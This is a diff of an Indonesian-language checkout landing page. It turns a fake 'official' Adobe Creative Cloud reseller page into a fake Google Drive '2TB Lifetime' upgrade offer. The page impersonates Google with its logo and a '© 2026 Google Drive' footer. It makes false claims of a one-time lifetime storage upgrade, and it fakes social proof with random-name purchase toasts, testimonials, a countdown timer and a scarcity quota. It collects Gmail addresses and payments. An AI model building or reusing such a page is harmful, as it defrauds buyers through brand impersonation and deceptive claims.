@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Adobe Creative Cloud - Official Resmi</title>
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Adobe_Creative_Cloud_rainbow_icon.svg/240px-Adobe_Creative_Cloud_rainbow_icon.svg.png">
-    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Upgrade Google Drive & Photos Unlimited - Penawaran Spesial!</title>
+    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png">
+    <link href="styles.css" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.1/qrcode.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"></noscript>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode/1.5.1/qrcode.min.js" defer></script>
     
     <!-- Meta Pixel Code -->
     <script>
@@ -33,8 +33,8 @@
 
     <style>
         :root {
-            --primary: #E31E24;
-            --primary-dark: #C21B20;
+            --primary: #1a73e8;
+            --primary-dark: #1557b0;
             --secondary: #F5F5F7;
             --text-main: #1D1D1F;
             --text-secondary: #86868B;
@@ -74,14 +74,6 @@
             }
         }
 
-        /* Flash Sale Card & Sheet */
-        
-        .sheet-backdrop { opacity: 0; transition: opacity .18s ease; }
-        .sheet-panel { transform: translateY(14px); opacity: 0; transition: transform .22s ease, opacity .22s ease; }
-        .sheet-open .sheet-backdrop { opacity: 1; }
-        .sheet-open .sheet-panel { transform: translateY(0); opacity: 1; }
-        .no-bounce { overscroll-behavior: contain; }
-
         /* Glassmorphism Header */
         .sticky-header {
             position: sticky;
@@ -113,7 +105,7 @@
         .modern-input:focus {
             border-color: var(--primary);
             background: white;
-            box-shadow: 0 0 0 3px rgba(227, 30, 36, 0.1);
+            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.1);
         }
 
         .input-icon {
@@ -140,6 +132,7 @@
         .package-card.selected {
             border-color: var(--primary);
             background: #F0F7FF;
+            cursor: default;
         }
 
         .package-check {
@@ -202,8 +195,8 @@
 
         .payment-option.selected {
             border-color: var(--primary);
-            background: #FEF2F2;
-            box-shadow: 0 2px 8px rgba(227, 30, 36, 0.1);
+            background: #F0F7FF;
+            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.1);
         }
 
         .payment-option img {
@@ -232,7 +225,7 @@
             font-weight: 600;
             cursor: pointer;
             transition: transform 0.1s, background 0.2s;
-            box-shadow: 0 4px 12px rgba(227, 30, 36, 0.25);
+            box-shadow: 0 4px 12px rgba(26, 115, 232, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -452,7 +445,7 @@
         }
         
         .copy-btn {
-            background: rgba(227, 30, 36, 0.1);
+            background: rgba(26, 115, 232, 0.1);
             color: var(--primary);
             border: none;
             padding: 4px 10px;
@@ -461,6 +454,17 @@
             font-weight: 600;
             cursor: pointer;
         }
+
+        /* New Card & Sheet Styles */
+
+        /* Bottom sheet animation */
+        .sheet-backdrop { opacity: 0; transition: opacity .18s ease; }
+        .sheet-panel { transform: translateY(14px); opacity: 0; transition: transform .22s ease, opacity .22s ease; }
+        .sheet-open .sheet-backdrop { opacity: 1; }
+        .sheet-open .sheet-panel { transform: translateY(0); opacity: 1; }
+
+        /* prevent overscroll bounce inside sheet */
+        .no-bounce { overscroll-behavior: contain; }
     </style>
 </head>
 <body>
@@ -472,7 +476,7 @@
         </div>
         <div class="text-sm">
             <p class="font-semibold text-gray-900" id="toast-name">Budi Santoso</p>
-            <p class="text-gray-500 text-xs">Baru saja membeli paket 1 Tahun</p>
+            <p class="text-gray-500 text-xs">Baru saja membeli paket 2TB Lifetime</p>
         </div>
     </div>
 
@@ -482,14 +486,14 @@
             <!-- Header -->
             <div class="sticky-header px-6 py-4 flex items-center justify-between">
                 <div class="flex items-center gap-2">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4c/Adobe_Creative_Cloud_rainbow_icon.svg/48px-Adobe_Creative_Cloud_rainbow_icon.svg.png" alt="Adobe Logo" class="w-8 h-8">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Google_Drive_icon_%282020%29.svg/330px-Google_Drive_icon_%282020%29.svg.png" alt="Google Drive Logo" class="w-8 h-8">
                     <div>
-                        <h1 class="font-bold text-lg leading-none">Adobe CC</h1>
-                        <p class="text-xs text-gray-500 font-medium">Official Resmi</p>
+                        <h1 class="font-bold text-lg leading-none">Google Drive</h1>
+                        <p class="text-xs text-gray-500 font-medium">Official Upgrade</p>
                     </div>
                 </div>
-                <div class="bg-red-50 text-red-600 px-3 py-1 rounded-full text-xs font-semibold">
-                    <i class="fas fa-check-circle mr-1"></i> Garansi
+                <div class="bg-blue-50 text-blue-600 px-3 py-1 rounded-full text-xs font-semibold">
+                    <i class="fas fa-check-circle mr-1"></i> Garansi Resmi
                 </div>
             </div>
 
@@ -499,8 +503,8 @@
                     <span class="inline-block bg-red-100 text-red-600 px-3 py-1 rounded-full text-xs font-bold mb-3 animate-pulse">
                         🔥 PROMO TERBATAS
                     </span>
-                    <h2 class="text-2xl font-bold mb-2">Upgrade Akun Pribadi</h2>
-                    <p class="text-gray-500 text-sm px-4">Dapatkan akses full Adobe Creative Cloud ke email pribadi Anda. Legal, Aman & Bergaransi.</p>
+                    <h2 class="text-2xl font-bold mb-2">Upgrade Penyimpanan Google</h2>
+                    <p class="text-gray-500 text-sm px-4">Sekali bayar, aktif seumur hidup (Lifetime) di akun sendiri. Legal & Aman.</p>
                 </div>
 
                 <!-- Form -->
@@ -511,7 +515,7 @@
                         <div id="package-selection-container" class="space-y-3">
                             <!-- Package cards will be rendered here by JavaScript -->
                         </div>
-                        <input type="hidden" id="selectedPackage" name="package" value="yearly">
+                        <input type="hidden" id="selectedPackage" name="package" value="lifetime">
                     </div>
 
                     <!-- Testimonials -->
@@ -537,7 +541,7 @@
                         </div>
 
                         <div class="input-group">
-                            <input type="email" id="email" name="email" class="modern-input" placeholder="Email untuk Adobe ID" required>
+                            <input type="email" id="email" name="email" class="modern-input" placeholder="Email Gmail (untuk di-upgrade)" required>
                             <i class="fas fa-envelope input-icon"></i>
                         </div>
                     </div>
@@ -556,7 +560,7 @@
 
                     <!-- Hidden Fields -->
                     <input type="text" name="honeypot" style="display: none" tabindex="-1" autocomplete="off">
-                    <input type="hidden" name="sheetName" value="adobe">
+                    <input type="hidden" name="sheetName" value="upstorage">
 
                     <!-- Payment Method -->
                     <div class="space-y-3 animate-fade-in" style="animation-delay: 0.25s">
@@ -584,7 +588,7 @@
                     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Gopay_logo.svg/1200px-Gopay_logo.svg.png" class="h-6">
                 </div>
                 
-                <p class="text-center text-xs text-gray-400 mt-8">© 2025 Adobe Official Reseller. All Rights Reserved.</p>
+                <p class="text-center text-xs text-gray-400 mt-8">© 2026 Google Drive. All Rights Reserved.</p>
             </div>
 
             <!-- Sticky Bottom Bar -->
@@ -592,7 +596,7 @@
                 <div class="max-w-[520px] mx-auto flex items-center justify-between gap-4">
                     <div>
                         <p class="text-xs text-gray-500">Total Pembayaran</p>
-                        <p class="text-xl font-bold text-red-600" id="total-price-display">Rp 350.xxx</p>
+                        <p class="text-xl font-bold text-blue-600" id="total-price-display">Rp 250.xxx</p>
                     </div>
                     <button type="button" id="submit-btn" class="btn-checkout flex-1" onclick="handleFormSubmit()">
                         Beli Sekarang <i class="fas fa-arrow-right"></i>
@@ -612,7 +616,7 @@
 
             <div class="p-6 pb-24">
                 <!-- Timer -->
-                <div class="bg-[#E31E24] text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-red-200">
+                <div class="bg-blue-600 text-white rounded-xl p-4 text-center mb-6 shadow-lg shadow-blue-200">
                     <p class="text-xs opacity-80 mb-1">Selesaikan pembayaran dalam</p>
                     <div class="text-2xl font-bold font-mono" id="countdown">23:59:59</div>
                 </div>
@@ -622,7 +626,7 @@
                     <div class="absolute top-0 left-0 w-full h-1 bg-gray-200"></div>
                     <p class="text-gray-500 text-sm mb-1">Total yang harus dibayar</p>
                     <div class="flex items-center justify-center gap-2 mb-2">
-                         <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 350.123</h1>
+                         <h1 class="text-3xl font-bold text-gray-900" id="payment-amount">Rp 250.123</h1>
                          <button class="copy-btn" onclick="copyText('payment-amount-raw')"><i class="far fa-copy"></i></button>
                     </div>
             <p class="text-xs text-red-500 bg-red-50 inline-block px-2 py-1 rounded mb-4">
@@ -654,38 +658,9 @@
                     </div>
                 </div>
                 
-                <!-- OCR Payment Verification -->
-                <div id="ocr-container" class="mt-8 bg-white border-2 border-dashed border-blue-200 rounded-xl p-6 text-center hover:bg-blue-50 transition-colors cursor-pointer relative overflow-hidden group" onclick="document.getElementById('payment-proof-input').click()">
-                    <h3 class="font-bold text-gray-900 mb-2">Verifikasi Pembayaran</h3>
-                    
-                    <input type="file" id="payment-proof-input" accept="image/*" class="hidden" onchange="handleImageUpload(event)">
-                    
-                    <!-- Initial State -->
-                    <div id="ocr-initial-state">
-                        <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-3 group-hover:scale-110 transition-transform">
-                            <i class="fas fa-cloud-upload-alt text-2xl"></i>
-                        </div>
-                        <p class="text-sm font-semibold text-gray-700">Klik untuk Upload Bukti Transfer</p>
-                        <p class="text-xs text-gray-400 mt-1">Sistem akan memverifikasi pembayaran anda secara otomatis.</p>
-                    </div>
-
-                    <!-- Scanning State -->
-                    <div id="ocr-scanning-state" class="hidden absolute inset-0 bg-white flex flex-col items-center justify-center z-10">
-                        <div class="relative w-16 h-16 mb-4">
-                             <div class="absolute inset-0 border-4 border-gray-200 rounded-full"></div>
-                             <div class="absolute inset-0 border-4 border-blue-600 rounded-full border-t-transparent animate-spin"></div>
-                             <div class="absolute inset-0 flex items-center justify-center text-blue-600">
-                                <i class="fas fa-search"></i>
-                             </div>
-                        </div>
-                        <p class="text-sm font-semibold text-blue-600 animate-pulse">Memverifikasi Bukti...</p>
-                    </div>
-
-                </div>
-
                 <!-- Confirmation Button -->
-                <a id="wa-confirm-btn" href="#" target="_blank" class="block mt-4 w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-center shadow-lg shadow-green-200 transition-all">
-                    <i class="fab fa-whatsapp text-lg mr-2"></i> Konfirmasi Manual (WA)
+                <a id="wa-confirm-btn" href="#" target="_blank" class="block mt-8 w-full bg-green-500 hover:bg-green-600 text-white font-bold py-4 rounded-xl text-center shadow-lg shadow-green-200 transition-all">
+                    <i class="fab fa-whatsapp text-lg mr-2"></i> Konfirmasi Pembayaran
                 </a>
             </div>
         </div>
@@ -724,7 +699,7 @@
             </ul>
 
             <button id="btnOk" type="button"
-              class="mt-4 h-12 w-full rounded-2xl bg-[#E31E24] text-sm font-semibold text-white active:scale-[.99]">
+              class="mt-4 h-12 w-full rounded-2xl bg-[#1a73e8] text-sm font-semibold text-white active:scale-[.99]">
               Oke, Mengerti
             </button>
           </div>
@@ -733,42 +708,15 @@
     </div>
 
     <!-- Modals -->
-    <!-- OCR Success Modal -->
-    <div id="ocrSuccessModal" class="modal-overlay">
-        <div class="modal-box">
-            <div class="w-20 h-20 bg-green-100 text-green-600 rounded-full flex items-center justify-center mx-auto mb-5 text-4xl shadow-sm">
-                <i class="fas fa-check-circle"></i>
-            </div>
-            <h3 class="text-2xl font-bold mb-2 text-gray-900">Pembayaran Berhasil!</h3>
-            <p class="text-gray-500 mb-8 px-4 text-sm leading-relaxed">Terima kasih! Bukti pembayaran Anda telah diverifikasi. Pesanan Anda sedang diproses dan akan segera dikirim.</p>
-            <button onclick="closeModal('ocrSuccessModal')" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3.5 rounded-xl transition-colors shadow-lg shadow-green-200">Tutup</button>
-        </div>
-    </div>
-
-    <!-- OCR Failure Modal -->
-    <div id="ocrFailureModal" class="modal-overlay">
-        <div class="modal-box">
-            <div class="w-20 h-20 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-5 text-4xl shadow-sm">
-                <i class="fas fa-exclamation-triangle"></i>
-            </div>
-            <h3 class="text-2xl font-bold mb-2 text-gray-900">Verifikasi Gagal</h3>
-            <p class="text-gray-500 mb-8 px-4 text-sm leading-relaxed" id="ocrFailureMsg">Bukti pembayaran tidak valid atau tidak terbaca. Silakan upload ulang bukti yang jelas.</p>
-            <div class="flex flex-col gap-3">
-                <button onclick="retryOCRUpload()" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3.5 rounded-xl transition-colors shadow-lg shadow-blue-200">Coba Upload Lagi</button>
-                <button onclick="closeModal('ocrFailureModal')" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-600 font-bold py-3.5 rounded-xl transition-colors">Tutup</button>
-            </div>
-        </div>
-    </div>
-
     <!-- Info Modal -->
     <div id="infoModal" class="modal-overlay">
         <div class="modal-box">
-            <div class="w-16 h-16 bg-red-100 text-red-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
+            <div class="w-16 h-16 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center mx-auto mb-4 text-2xl">
                 <i class="fas fa-info"></i>
             </div>
             <h3 class="text-xl font-bold mb-2" id="modalTitle">Judul</h3>
             <p class="text-gray-500 mb-6" id="modalMessage">Pesan</p>
-            <button onclick="closeModal('infoModal')" class="w-full bg-[#E31E24] text-white font-bold py-3 rounded-xl">Mengerti</button>
+            <button onclick="closeModal('infoModal')" class="w-full bg-blue-600 text-white font-bold py-3 rounded-xl">Mengerti</button>
         </div>
     </div>
 
@@ -795,55 +743,54 @@
 
     <script>
         // --- DATA & CONFIG ---
-        // PENTING: GANTI URL INI DENGAN URL DEPLOYMENT APPS SCRIPT ANDA
-        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbz1lSDdK_7h7ZAIVslmoigtS1di4R8UDJW7Vx8M-bmeTgBH8eIifTk1KkEwiFCFaJLt/exec';
-        
         const uniqueCode = Math.floor(Math.random() * (500 - 100 + 1)) + 100;
         
         // RESTORED DATA
         const FIRST_NAMES = [ "Budi Santoso", "Ayu", "Rahmat", "Citra Dewi Kusuma", "Bayu Pratama", "Lina", "Wulan", "Adi", "Farhan Syahputra", "Hendra Wijaya", "Nana Puspita Dewi", "Joko", "Mega Sari", "Gilang Pramana Putra", "Sari", "Dedi", "Eka Suryani", "Teguh", "Putri Lestari Ayu", "Andi", "Bagus Wijaya", "Ilham Saputra Nugraha", "Rizal", "Mira Astuti", "Puspita", "Hari", "Tri Saputra", "Cahya Pratama", "Surya Darmawan Putra", "Wahyu Ramadhan", "Agus", "Indra Permana", "Linda", "Fajar Mahendra Saputra", "Yusuf", "Pramono Adi Nugroho", "Sinta Dewi", "Bima Pratama", "Dian", "Hasan Basri", "Nurul Aini", "Arif Budiman", "Feri", "Lukman Hakim", "Rangga", "Rini Anggraini Putri", "Tono", "Hadi Prasetyo", "Elisa Purnama", "Anisa Rahma", "Gunawan", "Melati", "Bagus Prasetyo Ramadhan", "Septi Amelia", "Cindy Amelia", "Windi Saputri", "Galih Pratama", "Evi", "Putra", "Slamet Riyadi", "Latif Hidayat", "Gita Puspita", "Darmawan", "Maya", "Erik Saputra Pratama", "Jani", "Jefri Maulana", "Bella Sari", "Maulana", "Novi Andriana Lestari", "Fajar Nugroho", "Taufik Hidayat", "Prasetyo", "Samsul", "Agung", "Endang", "Indah", "Hana Pertiwi", "Mirna", "Yulia", "Panca", "Niken", "Rio", "Adi Putra Ramadhan", "Ganda", "Wahida", "Robby Saputra", "Halim", "Firman Saputra", "Berlian Putra", "Ari", "Joko Setiawan", "Mustika", "Bahar", "Mega", "Erlangga", "Sofyan", "Doni", "Fatimah", "Dian Purnama Sari", "Rama", "Imam Saputra", "Johan", "Gusman", "Lintang", "Nabila", "Beni", "Purnama", "Murni", "Malik", "Nurlan", "Doni Saputra", "Lastri", "Berlinda", "Rasyid", "Tari", "Nia", "Tirta", "Juli Andriani", "Lutfi", "Suci", "Arman", "Yani", "Citra Ayu", "Harto", "Rangga Pratama", "Febrina", "Indra Gunawan Saputra", "Tomi", "Sutrisno", "Risma", "Jihan Ayu Pratiwi", "Lestari", "Dewi Kusuma", "Fahmi", "Rifki", "Wira", "Putra Wijaya", "Beni Setiawan", "Asep", "Gerry", "Prasetia", "Euis", "Latif", "Pajar", "Rahmat Hidayat", "Rudi", "Tika", "Danu", "Hesti", "Syahrul", "Anwar", "Miranti", "Nuraini", "Nurman", "Eman Kurnia", "Nirmala", "Hari Susanto", "Taufan", "Tono Prabowo", "Bayu Saputra Nugroho", "Darma", "Nurlaila", "Hafid", "Mustofa", "Elok", "Gunarto", "Novi", "Lasman", "Jamaludin", "Andi Wijaya Putra", "Herman", "Mila", "Wibowo", "Prayitno", "Adi Saputra", "Jamal", "Irfan", "Iskandar", "Yudha", "Lutris", "Samsul Hidayat", "Heru", "Bagus", "Rudianto", "Nanda Putri", "Laila Rahma", "Frans", "Hilda", "Cahya", "Rudi Pratama", "Setiawan", "Rangga Saputra", "Puspa", "Doni Prasetyo", "Nurul", "Febri", "Mega Sari Lestari", "Suyatno", "Tomiadi", "Fikri", "Lani", "Intan", "Johan Saputra", "Iwan", "Berliano", "Ilham", "Teddy", "Lani Puspita", "Eka Putri Andayani", "Hani", "Adi Wijaya", "Adit", "Dicky", "Gopal", "Pramono", "Gunadi", "Gilang", "Joko Prayitno Adi", "Mira", "Puspita Sari", "Maulana Hakim", "Putri Ayu Lestari", "Malik Prasetyo", "Toriq", "Joni", "Gilang Pratama", "Bagus Wijaya Putra", "Berlian", "Wandi", "Nurman Saputra", "Fajarudin", "Lutfi Pratama", "Citra", "Nanda", "Laras", "Tuti", "Yani Pratiwi", "Gusman Saputra", "Rangga Putra", "Prasetiawan", "Ismail", "Heri", "Adi Nugroho", "Putri", "Prasetyo Adi", "Dona", "Gani", "Jihan", "Puspita Dewi", "Rizal Maulana", "Mahendra", "Ayu Pratiwi", "Rangga Setiawan", "Lina Sari", "Fani", "Adi Wijaya Putra", "Sari Melati", "Andri", "Bima", "Teguh Santoso Adi", "Fajar", "Wulan Dewi", "Rama Pratama", "Nana", "Farhan", "Dion", "Melati Pertiwi", "Adi Putra", "Joko Santoso", "Doni Setiawan", "Lintang Pertiwi", "Septi", "Gopal Pramana", "Tomi Pratama", "Rio Nugraha", "Cindy", "Hafid Saputra", "Hendra", "Niken Lestari", "Rangga Nugroho", "Putri Ayu", "Sofyan Hidayat", "Robby", "Bima Saputra", "Indra", "Adi Kurniawan", "Nanda Saputra", "Gilang Saputra", "Wahyu", "Puspita Ayu", "Rudi Hartono", "Wulan Dewi Pertiwi", "Ayu Pratiwi Lestari", "Tono Adi", "Dedi Kurniawan", "Prasetyo Ramadhan", "Adi Setiawan", "Mira Lestari", "Farhan Syahputra Adi", "Nurul Hidayah", "Sari Anggraini", "Bayu", "Eman", "Putra Adi Nugroho", "Lestari Ayu", "Bambang", "Rangga Hidayat", "Mega Putri", "Adi Nugraha", "Anisa", "Siska", "Wandi Putra", "Fajar Saputra", "Gunawan Pratama", "Heri Setiawan", "Arif", "Ilham Nugroho", "Bagus Pratama", "Erlangga Putra", "Rian", "Pandu", "Tari Ayu", "Hendro", "Risma Ayu", "Adi Pratama", "Septi Ayu", "Bambang Santoso", "Lukman", "Gani Saputra", "Hasan", "Feri Kurniawan", "Tirta", "Bambang Prasetyo", "Pajar Saputra", "Arman Putra", "Murni Ayu", "Hafiz", "Euis Sari", "Bayu Nugroho", "Tomi Saputra", "Gerry Pratama", "Arif Prasetyo", "Johan Putra", "Hafid Nugraha", "Nabila Pertiwi", "Latif Saputra", "Ari Saputra", "Rio Saputra", "Tono Saputra", "Wandi Saputra", "Mahendra Putra", "Ilham Pratama", "Putri Dewi", "Adi Lestari", "Rangga Maulana", "Bayu Hidayat", "Fani Puspita", "Taufik", "Bagus Saputra", "Novi Puspita", "Rahmat Hidayatullah Putra", "Prayitno Saputra", "Adi Ramadhan", "Bayu Wijaya", "Gilang Nugraha", "Rangga Prasetyo", "Putra Purnama", "Wulan Pertiwi", "Adi Wijaya Ramadhan", "Budi", "Rian Pratama", "Samsul Nugroho", "Wahyu Saputra", "Teguh Prasetyo", "Fikri Nugraha", "Rizki Pratama" ];
         
         const testimonialImages = [
-            "https://pixvid.org/images/2025/11/14/mPYhr.jpg", "https://pixvid.org/images/2025/11/14/mPYyw.jpg", "https://pixvid.org/images/2025/11/14/mPYBE.jpg", "https://pixvid.org/images/2025/11/14/mPi89.jpg", "https://pixvid.org/images/2025/11/14/mPitS.jpg", "https://pixvid.org/images/2025/11/14/mPiM2.jpg", "https://pixvid.org/images/2025/11/14/mPicV.jpg", "https://pixvid.org/images/2025/11/14/mPuZk.jpg", "https://pixvid.org/images/2025/11/14/mPuYg.jpg", "https://pixvid.org/images/2025/11/14/mPuAO.jpg", "https://pixvid.org/images/2025/11/14/mPuLF.jpg", "https://pixvid.org/images/2025/11/14/mPJzn.jpg", "https://pixvid.org/images/2025/11/14/mPJuM.jpg", "https://pixvid.org/images/2025/11/14/mPJGa.jpg", "https://pixvid.org/images/2025/11/14/mPJfB.jpg", "https://pixvid.org/images/2025/11/14/mPKHf.jpg", "https://pixvid.org/images/2025/11/14/mPKEm.jpg", "https://pixvid.org/images/2025/11/14/mPKbz.jpg", "https://pixvid.org/images/2025/11/14/mPEel.jpg", "https://pixvid.org/images/2025/11/14/mPErY.jpg", "https://pixvid.org/images/2025/11/14/mPEoo.jpg", "https://pixvid.org/images/2025/11/14/mPEXd.jpg", "https://pixvid.org/images/2025/11/14/mPnUb.jpg", "https://pixvid.org/images/2025/11/14/mPnlN.jpg", "https://pixvid.org/images/2025/11/14/mPn6v.jpg", "https://pixvid.org/images/2025/11/14/mPn25.jpg", "https://pixvid.org/images/2025/11/14/mPo57.jpg", "https://pixvid.org/images/2025/11/14/mPoqT.jpg", "https://pixvid.org/images/2025/11/14/mPo9i.jpg"
+            "https://pixvid.org/images/2025/11/04/kS2aB.jpg",
+            "https://pixvid.org/images/2025/11/04/kSBPf.jpg",
+            "https://pixvid.org/images/2025/11/04/kSBrm.jpg",
+            "https://pixvid.org/images/2025/11/04/kSBoz.jpg",
+            "https://pixvid.org/images/2025/11/04/kSBXl.jpg",
+            "https://pixvid.org/images/2025/11/04/kSNUY.jpg",
+            "https://pixvid.org/images/2025/11/04/kSNlo.jpg",
+            "https://pixvid.org/images/2025/11/04/kSN6d.jpg",
+            "https://pixvid.org/images/2025/11/04/kSNsb.jpg",
+            "https://pixvid.org/images/2025/11/04/kScmN.jpg",
+            "https://pixvid.org/images/2025/11/04/kSchv.jpg",
+            "https://pixvid.org/images/2025/11/04/kSc95.jpg",
+            "https://pixvid.org/images/2025/11/04/kScN7.jpg"
         ];
         
         const fullFeaturesList = [
-            "Akses 20+ Aplikasi Adobe (Photoshop, Illustrator, Premiere Pro, After Effects, InDesign, dll)",
-            "Penyimpanan Cloud 100GB untuk backup file project",
-            "Sinkronisasi Antar Perangkat (Desktop, Mobile, Web)",
-            "Akses ke Adobe Fonts (Ribuan Font Premium)",
-            "Akses ke Adobe Stock (Asset Foto & Video)",
-            "Fitur AI Generatif (Adobe Firefly)",
-            "Update Otomatis Fitur Terbaru",
-            "Adobe Portfolio & Behance",
-            "Akses Offline (Tanpa Internet)",
-            "Keamanan Terenkripsi & Legal",
-            "Support Mac, Windows, iPad, iPhone, Android",
-            "Bisa pindah device (Logout/Login)",
-            "Full Garansi selama durasi langganan"
+            "<strong>Kapasitas 2TB:</strong> Nikmati penyimpanan raksasa 2TB yang terbagi untuk Google Drive, Google Photos, dan Gmail.",
+            "<strong>Akses File Di Mana Saja:</strong> Buka dan edit file Anda dari komputer, tablet, atau smartphone.",
+            "<strong>Satu Solusi Terintegrasi:</strong> Semua kebutuhan penyimpanan Anda dalam satu paket hemat.",
+            "<strong>Keamanan Kelas Dunia:</strong> File Anda dilindungi oleh infrastruktur keamanan canggih dari Google.",
+            "<strong>Berbagi & Kolaborasi Mudah:</strong> Bagikan file dan folder dengan mudah, serta bekerja bersama secara real-time.",
+            "<strong>Sekali Bayar Seumur Hidup:</strong> Tanpa biaya langganan bulanan atau tahunan.",
+            "<strong>Gunakan Akun Pribadi Anda:</strong> Upgrade dilakukan langsung pada akun Google yang sudah Anda miliki.",
+            "<strong>100% Aman & Bergaransi:</strong> Produk asli dengan jaminan privasi penuh."
         ];
         
         const faqList = [
-            { q: "Apakah produk ini resmi?", a: "Ya, produk yang kami tawarkan 100% original dan legal. Aktivasi dilakukan melalui undangan resmi dari Adobe ke email Anda." },
-            { q: "Bagaimana proses aktivasinya?", a: "Setelah pembayaran, kami akan mengirimkan undangan ke email Adobe Anda. Anda hanya perlu menerima undangan tersebut untuk mengaktifkan lisensi Creative Cloud." },
-            { q: "Apakah ini aman?", a: "Tentu saja. Kami tidak pernah meminta password akun Adobe Anda. Prosesnya 100% aman dan privasi Anda terjamin." },
-            { q: "Apa saja yang saya dapatkan?", a: "Anda akan mendapatkan akses ke semua aplikasi di dalam Adobe Creative Cloud (Photoshop, Illustrator, Premiere Pro, dll) dan penyimpanan cloud sebesar 100GB." },
-            { q: "Berapa lama prosesnya?", a: "Prosesnya sangat cepat, biasanya hanya 5-15 menit setelah konfirmasi pembayaran." },
-            { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses aktivasi gagal karena kesalahan dari pihak kami." }
+            { q: "Apakah ini benar-benar 2TB dan seumur hidup?", a: "Ya, benar. Anda akan mendapatkan penyimpanan 2TB untuk Google Drive dengan sistem pembayaran sekali untuk selamanya. Tidak ada biaya bulanan atau tahunan tersembunyi." },
+            { q: "Bagaimana proses upgrade untuk Google Drive?", a: "Prosesnya otomatis dan terintegrasi dengan akun Google Anda. Setelah pembayaran, penyimpanan pada Google Drive Anda akan langsung ter-upgrade menjadi 2TB. Anda tidak perlu melakukan apa-apa lagi dan bisa langsung menikmati kapasitas 2TB di akun pribadi Anda." },
+            { q: "Apakah ini aman dan legal?", a: "Tentu saja. Metode yang kami gunakan adalah sah melalui fitur Google Workspace. Kami tidak pernah meminta password Anda (untuk upgrade Drive) dan privasi file Anda 100% terjamin. Anda memiliki kontrol penuh atas data Anda." },
+            { q: "Apa bedanya dengan langganan Google One?", a: "Google One adalah layanan langganan resmi dari Google dengan kuota terbatas (misal 2TB) dan biaya bulanan/tahunan. Produk kami memberikan Anda penyimpanan 2TB dengan sistem sekali bayar untuk selamanya, melalui metode upgrade langsung pada akun Anda." },
+            { q: "Bisakah saya memindahkan file lama saya?", a: "Tentu bisa. Karena upgrade ini langsung diterapkan pada akun Google Drive pribadi Anda, semua file lama Anda akan tetap ada di tempatnya dan secara otomatis menjadi bagian dari penyimpanan 2TB yang baru. Anda tidak perlu memindahkan file atau folder apa pun." },
+            { q: "Berapa lama proses aktivasinya?", a: "Prosesnya sangat cepat. Setelah Anda melakukan konfirmasi pembayaran, aktivasi biasanya selesai dalam waktu 5-15 menit, maksimal 1x24 jam." },
+            { q: "Apakah ada garansi?", a: "Kami memberikan garansi uang kembali penuh jika proses upgrade gagal karena kesalahan dari pihak kami. Kami juga memberikan garansi layanan seumur hidup." }
         ];
 
         const packages = {
-            monthly: {
-                id: 'monthly',
-                name: "Adobe CC (1 Bulan)",
-                price: 50000,
-                normalPrice: 250000
-            },
-            yearly: {
-                id: 'yearly',
-                name: "Adobe CC (1 Tahun)",
-                price: 350000,
-                normalPrice: 2500000
+            lifetime: {
+                id: 'lifetime',
+                name: "Google Drive 2TB (Lifetime)",
+                price: 250000,
+                normalPrice: 1579000
             }
         };
 
@@ -925,7 +872,7 @@
     
             return { isValid: true, message: 'Nomor valid.' };
         }
-        let currentPackage = 'yearly';
+        let currentPackage = 'lifetime';
         let currentPayment = 'qris';
         let expiryTime;
         let countdownInterval;
@@ -953,15 +900,9 @@
             if (!container) return;
 
             const formatCurrency = (amount) => `Rp ${amount.toLocaleString('id-ID')}`;
-            const pkg = packages[currentPackage];
-            
-            // Determine styles for switcher based on selection
-            const isMonthly = currentPackage === 'monthly';
-            const isYearly = currentPackage === 'yearly';
-            
-            const btnClassBase = "flex-1 py-2 text-xs font-semibold rounded-lg transition-all duration-200";
-            const btnClassActive = "bg-white text-red-600 shadow-sm ring-1 ring-black/5";
-            const btnClassInactive = "text-gray-500 hover:text-gray-700 hover:bg-gray-50";
+
+            const lifetime = packages.lifetime;
+            const discount = Math.round(((lifetime.normalPrice - lifetime.price) / lifetime.normalPrice) * 100);
 
             // Calculate dynamic quota
             const now = new Date();
@@ -974,38 +915,28 @@
             const quota = Math.floor(Math.max(2, Math.min(100, p)));
 
             container.innerHTML = `
-                <!-- CARD (Flash Sale Style with Embedded Switcher) -->
+                <!-- CARD (C1-V3 + tombol Detail) -->
